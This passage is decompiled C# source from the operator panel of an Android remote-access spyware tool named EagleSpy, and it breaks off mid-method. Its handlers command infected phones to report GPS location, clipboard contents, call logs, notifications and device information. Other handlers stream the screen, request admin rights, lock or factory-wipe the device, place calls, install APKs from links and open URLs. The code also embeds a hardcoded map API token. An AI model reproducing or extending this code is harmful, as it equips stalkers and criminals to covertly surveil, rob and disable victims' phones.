		// Token: 0x060004C8 RID: 1224 RVA: 0x00062A9C File Offset: 0x00060C9C
		private void LIVELOCATION()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient3,
										Data.SPL_SOCKET,
										Data.SPL_DATA,
										Data.SPL_SOCKET,
										SecurityKey.getGPS
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004C9 RID: 1225 RVA: 0x00062BCC File Offset: 0x00060DCC
		private void Searchbtn_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.Rows.Count < 1)
			{
				EagleAlert.Showinformation("No Clients Found");
				return;
			}
			if (string.IsNullOrEmpty(this.searchtext.Text))
			{
				EagleAlert.Showinformation("Enter Text First");
				return;
			}
			checked
			{
				int num = this.ClientsWindow.Rows.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						Client client = (Client)this.ClientsWindow.Rows[i].Cells[8].Tag;
						if (!this.searchbefore.Contains(client.Row) && (client.ClientName.ToLower().Contains(this.searchtext.Text.ToLower()) | client.ClientAddressIP.ToLower().Contains(this.searchtext.Text.ToLower()) | client.Country.ToLower().Contains(this.searchtext.Text.ToLower()) | client.android.ToLower().Contains(this.searchtext.Text.ToLower()) | client.ClientName.ToLower().Contains(this.searchtext.Text.ToLower()) | client.ActiveNow.ToLower().Contains(this.searchtext.Text.ToLower())))
						{
							this.ClientsWindow.FirstDisplayedScrollingRowIndex = client.Row.Index;
							this.searchbefore.Add(client.Row);
							break;
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x060004CA RID: 1226 RVA: 0x00003771 File Offset: 0x00001971
		private void B_ok_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				this.ClientsWindow.SelectedRows[0].Selected = false;
			}
		}

		// Token: 0x060004CB RID: 1227 RVA: 0x00002423 File Offset: 0x00000623
		private void TCbattertpic_MouseEnter(object sender, EventArgs e)
		{
		}

		// Token: 0x060004CC RID: 1228 RVA: 0x00062D88 File Offset: 0x00060F88
		private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.ClientsWindow.Rows.Count > 0)
				{
					this.ClientsWindow.FirstDisplayedScrollingRowIndex = 0;
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004CD RID: 1229 RVA: 0x00062DCC File Offset: 0x00060FCC
		private void CLIENTSFOLDER()
		{
			try
			{
				if ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
				{
					string folderUSER = ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).FolderUSER;
					if (!Directory.Exists(folderUSER))
					{
						Directory.CreateDirectory(folderUSER);
					}
					Process.Start(folderUSER);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004CE RID: 1230 RVA: 0x00062E58 File Offset: 0x00061058
		private void DrakeUIButtonIcon11_Click(object sender, EventArgs e)
		{
			try
			{
				if ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
				{
					((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).Blockme(((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).ClientAddressIP);
					((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).Close(((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).myClient);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004CF RID: 1231 RVA: 0x00062F54 File Offset: 0x00061154
		private void DrakeUIButtonIcon10_Click(object sender, EventArgs e)
		{
			try
			{
				if ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
				{
					TcpClient myClient = ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).myClient;
					object[] array = new object[]
					{
						myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient1,
							Data.SPL_SOCKET,
							reso.domen,
							".info",
							Data.SPL_SOCKET,
							"method",
							Data.SPL_SOCKET,
							SecurityKey.Information,
							Data.SPL_SOCKET,
							"information"
						}),
						Codes.Encoding().GetBytes("null"),
						(Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag
					};
					((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).SendMessage(array);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004D0 RID: 1232 RVA: 0x000630AC File Offset: 0x000612AC
		private void DrakeUIButtonIcon9_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.ClientsWindow.Rows.Count > 0)
				{
					this.ClientsWindow.FirstDisplayedScrollingRowIndex = this.ClientsWindow.Rows[checked(this.ClientsWindow.Rows.Count - 1)].Index;
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004D1 RID: 1233 RVA: 0x0000379D File Offset: 0x0000199D
		private void Searchtext_TextChanged(object sender, EventArgs e)
		{
			this.searchbefore.Clear();
			if (!string.IsNullOrEmpty(this.searchtext.Text))
			{
				this.clearsrchbtn.Visible = true;
				return;
			}
			this.clearsrchbtn.Visible = false;
		}

		// Token: 0x060004D2 RID: 1234 RVA: 0x00002D24 File Offset: 0x00000F24
		private void DrakeUIButtonIcon13_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x060004D3 RID: 1235 RVA: 0x000037D5 File Offset: 0x000019D5
		private void DrakeUIButtonIcon12_Click(object sender, EventArgs e)
		{
			this.smoothfadedout(this, 40);
		}

		// Token: 0x060004D4 RID: 1236 RVA: 0x00063114 File Offset: 0x00061314
		[DebuggerStepThrough]
		private void smoothfadedout(Form targetform, int slowtime)
		{
			EagleSpyMain.VB_0024StateMachine_108_smoothfadedout vb_0024StateMachine_108_smoothfadedout = new EagleSpyMain.VB_0024StateMachine_108_smoothfadedout();
			vb_0024StateMachine_108_smoothfadedout._0024VB_0024Me = this;
			vb_0024StateMachine_108_smoothfadedout._0024VB_0024Local_targetform = targetform;
			vb_0024StateMachine_108_smoothfadedout._0024VB_0024Local_slowtime = slowtime;
			vb_0024StateMachine_108_smoothfadedout._0024State = -1;
			vb_0024StateMachine_108_smoothfadedout._0024Builder = AsyncVoidMethodBuilder.Create();
			vb_0024StateMachine_108_smoothfadedout._0024Builder.Start<EagleSpyMain.VB_0024StateMachine_108_smoothfadedout>(ref vb_0024StateMachine_108_smoothfadedout);
		}

		// Token: 0x060004D5 RID: 1237 RVA: 0x0006315C File Offset: 0x0006135C
		private void BlockClientToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGVblocked.Rows.Count <= 0 || this.DGVblocked.SelectedRows.Count <= 0)
			{
				return;
			}
			DataGridViewRow dataGridViewRow = this.DGVblocked.SelectedRows[0];
			if (dataGridViewRow == null)
			{
				return;
			}
			checked
			{
				int num = this.server.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						if (this.server[i].Blocklist.Contains(dataGridViewRow.Cells[1].Value.ToString()))
						{
							this.server[i].Blocklist.Remove(dataGridViewRow.Cells[1].Value.ToString());
							Data.MainForm.DGVblocked.Rows.Remove(dataGridViewRow);
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x060004D6 RID: 1238 RVA: 0x00063248 File Offset: 0x00061448
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.DataLog.Rows.Count <= 0 || this.DataLog.SelectedRows.Count <= 0)
			{
				return;
			}
			DataGridViewRow dataGridViewRow = this.DataLog.SelectedRows[0];
			if (dataGridViewRow == null)
			{
				return;
			}
			checked
			{
				try
				{
					int num = this.server.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						try
						{
							if (!this.server[i].Blocklist.Contains(dataGridViewRow.Cells[1].Value.ToString().Replace(" ", "")))
							{
								this.server[i].Blocklist.Add(dataGridViewRow.Cells[1].Value.ToString().Replace(" ", ""));
								Data.MainForm.DGVblocked.Rows.Add(new object[]
								{
									GetFlagThisIp.ThisIp(dataGridViewRow.Cells[1].Value.ToString()),
									dataGridViewRow.Cells[1].Value.ToString()
								});
							}
						}
						catch (Exception)
						{
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060004D7 RID: 1239 RVA: 0x000037E0 File Offset: 0x000019E0
		private void Clearsrchbtn_Click(object sender, EventArgs e)
		{
			this.searchtext.Text = "";
		}

		// Token: 0x060004D8 RID: 1240 RVA: 0x00002423 File Offset: 0x00000623
		private void Mapupdater_Tick(object sender, EventArgs e)
		{
		}

		// Token: 0x060004D9 RID: 1241 RVA: 0x00002423 File Offset: 0x00000623
		private void Mainbatteryico_MouseEnter(object sender, EventArgs e)
		{
		}

		// Token: 0x060004DA RID: 1242 RVA: 0x000633A8 File Offset: 0x000615A8
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			try
			{
				Process.Start("");
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004DB RID: 1243 RVA: 0x00002423 File Offset: 0x00000623
		private void DrakeUIImageButton1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060004DC RID: 1244 RVA: 0x00002423 File Offset: 0x00000623
		private void Battarypic_MouseEnter(object sender, EventArgs e)
		{
		}

		// Token: 0x060004DD RID: 1245 RVA: 0x000633D8 File Offset: 0x000615D8
		private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			try
			{
				Process.Start("https://telegram.me/eaglespy");
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004DE RID: 1246
		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern bool HideCaret(IntPtr hWnd);

		// Token: 0x060004DF RID: 1247 RVA: 0x00002423 File Offset: 0x00000623
		private void targetCtext_GotFocus(object sender, EventArgs e)
		{
		}

		// Token: 0x060004E0 RID: 1248 RVA: 0x00063408 File Offset: 0x00061608
		public string formnames(string input, string pass)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			new MD5CryptoServiceProvider();
			ASCIIEncoding asciiencoding = new ASCIIEncoding();
			byte[] bytes = asciiencoding.GetBytes(pass);
			try
			{
				rijndaelManaged.Key = bytes;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				byte[] array = Convert.FromBase64String(input);
				return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
			}
			catch (Exception)
			{
			}
			return "";
		}

		// Token: 0x060004E1 RID: 1249 RVA: 0x00063484 File Offset: 0x00061684
		private void SCREENREADERV1()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string text = "Screen_Reader_" + client.ClientRemoteAddress;
								if ((ScreenReader)MyProject.Application.OpenForms[text] == null)
								{
									new ScreenReader
									{
										Name = text,
										Title = string.Format("{0} - IP:{1}", "Screen Reader", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										Classclient = client
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004E2 RID: 1250 RVA: 0x000635B8 File Offset: 0x000617B8
		private void LiveModeToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient3,
										Data.SPL_SOCKET,
										Data.SPL_DATA,
										Data.SPL_SOCKET,
										SecurityKey.getGPS
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004E3 RID: 1251 RVA: 0x000636DC File Offset: 0x000618DC
		private void SilentModeGOIPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string[] latLng = Data.cityclass.GetLatLng(client.ClientAddressIP);
								if (latLng != null)
								{
									string text = "Location_Manager_" + client.ClientRemoteAddress;
									LocationManager locationManager = (LocationManager)MyProject.Application.OpenForms[text];
									if (locationManager == null)
									{
										reso.Directory_Exist(client);
										locationManager = new LocationManager();
										locationManager.infoMaps = new string[] { client.FolderUSER, client.ClientName };
										locationManager.Name = text;
										locationManager.Title = string.Format("{0} - IP:{1}", "Location Manager", client.ClientAddressIP);
										locationManager.Client = client.myClient;
										locationManager.classClient = client;
										locationManager.Issilent = true;
										locationManager.tmpFolderUSER = client.FolderUSER;
										if (!Directory.Exists(locationManager.tmpFolderUSER))
										{
											Directory.CreateDirectory(locationManager.tmpFolderUSER);
										}
										locationManager.Show();
										locationManager.Zoom = 15;
									}
									locationManager.ImageSize.Width = 480;
									locationManager.ImageSize.Height = 360;
									locationManager.Markers = reso.Between("<param name=\"markers_gsm\">", "</param>");
									locationManager.Link = "https://api.mapbox.com/styles/v1/";
									locationManager.Key = "pk.eyJ1IjoiYWxmYWtyYWtlbiIsImEiOiJja3h1Z283bWMzbDNhMnlxa3VpeDdmejZjIn0.K8KkGJxQgTUJroiFHsrewA";
									string text2 = reso.Maps_style();
									locationManager.style = reso.Between("<param name=\"" + text2 + "\">", "</param>");
									locationManager.Accuracy = "jump";
									locationManager.Speed = "jump";
									locationManager.List.Add(new double[]
									{
										Conversions.ToDouble(latLng[0]),
										Conversions.ToDouble(latLng[1])
									});
									locationManager.Text = locationManager.Title;
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004E4 RID: 1252 RVA: 0x0006397C File Offset: 0x00061B7C
		private void WebBrowserToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string text = "Web_Browser_" + client.ClientAddressIP;
								if ((WebViewMonitor)MyProject.Application.OpenForms[text] == null)
								{
									new WebViewMonitor
									{
										Name = text,
										Title = string.Format("{0} - IP:{1}", "Web Browser", client.ClientAddressIP),
										Tag = client.ClientAddressIP,
										Classclient = client
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004E5 RID: 1253 RVA: 0x00063AB0 File Offset: 0x00061CB0
		private void REQUESTADMINRIGHT()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[] { ':' });
								object[] array2 = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2 + Data.SPL_SOCKET + "adm<*>",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array2);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004E6 RID: 1254 RVA: 0x00063C7C File Offset: 0x00061E7C
		private void ADMINLOCKSCREEN()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[] { ':' });
								object[] array2 = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"adm<*>lck<*>",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array2);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004E7 RID: 1255 RVA: 0x00063E48 File Offset: 0x00062048
		private void PHONERESET()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								MsgBoxResult msgBoxResult = Interaction.MsgBox("All Phone Data Will be Removed\r\nAre you sure you want to Continue", MsgBoxStyle.YesNo, "Alert");
								if (msgBoxResult != MsgBoxResult.Yes)
								{
									if (msgBoxResult == MsgBoxResult.No)
									{
										break;
									}
								}
								else
								{
									string[] array = client.Keys.Split(new char[] { ':' });
									object[] array2 = new object[]
									{
										myClient,
										string.Concat(new string[]
										{
											SecurityKey.KeysClient2,
											Data.SPL_SOCKET,
											"adm<*>wip<*>",
											Data.SPL_SOCKET,
											array[0],
											Data.SPL_SOCKET,
											array[1],
											Data.SPL_SOCKET,
											SecurityKey.Lockscreen,
											Data.SPL_SOCKET,
											Conversions.ToString(0),
											Data.SPL_SOCKET,
											Conversions.ToString(0),
											Data.SPL_SOCKET,
											Data.SPL_ARRAY,
											Data.SPL_SOCKET,
											client.ClientRemoteAddress
										}),
										Codes.Encoding().GetBytes("null"),
										client
									};
									client.SendMessage(array2);
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004E8 RID: 1256 RVA: 0x0006403C File Offset: 0x0006223C
		private void ToolStripMenuItem5_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								CallPhone callPhone = new CallPhone();
								callPhone.L0.Text = "add Number";
								callPhone.StartPosition = FormStartPosition.Manual;
								callPhone.Location = Codes.FixSize(Data.MainForm, callPhone);
								if (callPhone.ShowDialog() == DialogResult.OK)
								{
									string text = callPhone.TextBox1.Text;
									string call = callPhone._Call;
									callPhone.Close();
									if (Operators.CompareString(text, null, false) != 0)
									{
										if (client != null)
										{
											object[] array = new object[]
											{
												myClient,
												string.Concat(new string[]
												{
													SecurityKey.KeysClient1,
													Data.SPL_SOCKET,
													reso.domen,
													".info",
													Data.SPL_SOCKET,
													"method",
													Data.SPL_SOCKET,
													SecurityKey.resultClient,
													Data.SPL_SOCKET,
													call,
													Data.SPL_DATA,
													"tel:",
													text.Trim()
												}),
												Codes.Encoding().GetBytes("null"),
												client
											};
											client.SendMessage(array);
										}
									}
								}
								else
								{
									callPhone.Close();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004E9 RID: 1257 RVA: 0x00064254 File Offset: 0x00062454
		private void ToolStripMenuItem6_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								Dialog1 dialog = new Dialog1();
								dialog.Title = "Enter APK Link";
								dialog.ShowDialog();
								if (dialog.DialogResult != DialogResult.OK)
								{
									break;
								}
								string[] array = client.Keys.Split(new char[] { ':' });
								object[] array2 = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"msg:",
										reso.ChekLink(dialog.Mytext.Text),
										":up",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array2);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004EA RID: 1258 RVA: 0x0006446C File Offset: 0x0006266C
		private void TOASTMESSAGE()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								Dialog1 dialog = new Dialog1();
								dialog.Title = "Enter Messege";
								dialog.ShowDialog();
								if (dialog.DialogResult != DialogResult.OK)
								{
									break;
								}
								string[] array = client.Keys.Split(new char[] { ':' });
								object[] array2 = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"msg:",
										dialog.Mytext.Text,
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array2);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004EB RID: 1259 RVA: 0x00064674 File Offset: 0x00062874
		private void ToolStripMenuItem8_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".info",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getClipboard,
										Data.SPL_SOCKET,
										"get",
										Data.SPL_DATA,
										"null"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004EC RID: 1260 RVA: 0x000647FC File Offset: 0x000629FC
		private void OPENURL()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								Dialog1 dialog = new Dialog1();
								dialog.Title = "Enter Link";
								dialog.ShowDialog();
								if (dialog.DialogResult != DialogResult.OK)
								{
									break;
								}
								string[] array = client.Keys.Split(new char[] { ':' });
								object[] array2 = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"lnk<*>",
										reso.ChekLink(dialog.Mytext.Text),
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array2);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004ED RID: 1261 RVA: 0x00064A0C File Offset: 0x00062C0C
		private void NOTIFICATIONLISTENER()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string text = "Notifications_" + client.ClientAddressIP;
								if ((Eaglepopup)MyProject.Application.OpenForms[text] == null)
								{
									new Eaglepopup
									{
										Location = this.ClientsWindow.PointToScreen(this.ClientsWindow.GetCellDisplayRectangle(0, dataGridViewRow.Index, false).Location),
										ClassClient = client
									}.Show();
									dataGridViewRow.Cells[8].Value = Codes.BlankImage();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004EE RID: 1262 RVA: 0x00064B54 File Offset: 0x00062D54
		private void CallsListnerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string text = "Calls_Log_" + client.ClientAddressIP;
								if ((EagleSpyCallLogs)MyProject.Application.OpenForms[text] == null)
								{
									EagleSpyCallLogs eagleSpyCallLogs = new EagleSpyCallLogs();
									eagleSpyCallLogs.Location = this.ClientsWindow.PointToScreen(this.ClientsWindow.GetCellDisplayRectangle(0, dataGridViewRow.Index, false).Location);
									eagleSpyCallLogs.ClassClient = client;
									dataGridViewRow.Cells[9].Value = Codes.BlankImage();
									eagleSpyCallLogs.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004EF RID: 1263 RVA: 0x00064C9C File Offset: 0x00062E9C
		private void PHONEINFORMATION()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".info",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.Information,
										Data.SPL_SOCKET,
										"information"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
